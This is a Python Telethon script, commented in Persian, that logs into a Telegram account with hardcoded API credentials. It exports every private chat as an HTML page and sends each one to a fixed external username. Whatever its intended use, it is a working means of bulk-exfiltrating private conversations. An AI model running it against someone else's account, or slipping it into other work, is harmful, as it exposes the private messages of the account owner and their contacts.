import asyncio
import html
import io
from telethon import TelegramClient
from telethon.tl.types import User

# اطلاعات حساب تلگرام
API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

# آیدی مقصدی که فایل‌ها برایش ارسال می‌شوند
TARGET_USER = "Moein_917"

# ساخت کلاینت تلگرام
client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()
    me = await client.get_me()

    my_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    print(f"Logged in as: {my_name} (@{me.username})")

    print("\nExport & Direct Transmission Started (HTML Mode)...\n")

    async for dialog in client.iter_dialogs():
        # فقط چت‌های شخصی (بدون ربات‌ها و گروه‌ها)
        if isinstance(dialog.entity, User) and not dialog.entity.bot:
            user = dialog.entity
            username = user.username if user.username else "NoUsername"
            chat_name = (
                f"{user.first_name or ''} {user.last_name or ''}".strip()
            )

            messages_html = []

            async for message in client.iter_messages(
                dialog.id, reverse=True
            ):
                if not message.text:
                    continue

                if message.sender_id == me.id:
                    sender_name = my_name
                    is_me = True
                else:
                    sender = await message.get_sender()
                    is_me = False
                    if sender:
                        sender_name = (
                            f"{sender.first_name or ''} {sender.last_name or ''}".strip()
                        )
                        if not sender_name:
                            sender_name = "Unknown"
                    else:
                        sender_name = "Unknown"

                # ایمن‌سازی متون برای جلوگیری از تداخل با کدهای HTML
                clean_sender = html.escape(sender_name)
                clean_text = html.escape(message.text)
                date_str = (
                    message.date.strftime("%Y-%m-%d %H:%M:%S")
                    if message.date
                    else ""
                )

                card_class = "msg-card me" if is_me else "msg-card"

                messages_html.append(
                    f"""
                    <div class="{card_class}">
                        <div class="sender">{clean_sender}</div>
                        <div class="date">{date_str}</div>
                        <div class="text">{clean_text}</div>
                    </div>
                """
                )

            if not messages_html:
                continue

            # ساخت ساختار کامل فایل HTML با استایل راست‌چین و شکیل
            full_html = f"""<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>چت با {html.escape(chat_name)}</title>
    <style>
        body {{
            font-family: Tahoma, 'Segoe UI', Arial, sans-serif;
            background-color: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 20px;
            direction: rtl;
        }}
        .container {{
            max-width: 750px;
            margin: 0 auto;
        }}
        .chat-header {{
            background-color: #1e293b;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #334155;
        }}
        .chat-header h2 {{
            margin: 0 0 8px 0;
            color: #38bdf8;
            font-size: 18px;
        }}
        .chat-header p {{
            margin: 0;
            color: #94a3b8;
            font-size: 13px;
        }}
        .msg-card {{
            background-color: #1e293b;
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 12px;
            border-right: 4px solid #3b82f6;
        }}
        .msg-card.me {{
            border-right-color: #10b981;
            background-color: #162438;
        }}
        .sender {{
            font-weight: bold;
            color: #60a5fa;
            font-size: 14px;
            margin-bottom: 4px;
        }}
        .msg-card.me .sender {{
            color: #34d399;
        }}
        .date {{
            font-size: 11px;
            color: #64748b;
            margin-bottom: 8px;
            direction: ltr;
            text-align: left;
        }}
        .text {{
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.6;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="chat-header">
            <h2>چت با: {html.escape(chat_name)}</h2>
            <p>نام کاربری: @{html.escape(username)} | شناسه: {user.id}</p>
        </div>
        {"".join(messages_html)}
    </div>
</body>
</html>"""

            # تبدیل متن HTML به بایت با انکودینگ UTF-8
            file_data = full_html.encode("utf-8")

            # ساخت فایل مجازی HTML در حافظه RAM
            file_stream = io.BytesIO(file_data)
            file_stream.name = f"{user.id}_{username}.html"

            # ارسال مستقیم فایل HTML به آیدی مقصد
            try:
                await client.send_file(
                    TARGET_USER,
                    file_stream,
                    caption=f"📂 Exported chat (HTML): {chat_name} (@{username})",
                )
                print(f"Sent HTML to @{TARGET_USER}: {file_stream.name}")
            except Exception as e:
                print(f"Error sending {file_stream.name}: {e}")

            # وقفه جهت جلوگیری از محدودیت ارسال تلگرام
            await asyncio.sleep(1)

    print("\nAll chats exported to HTML and sent successfully.")


# اجرای اسکریپت
with client:
    client.loop.run_until_complete(main())
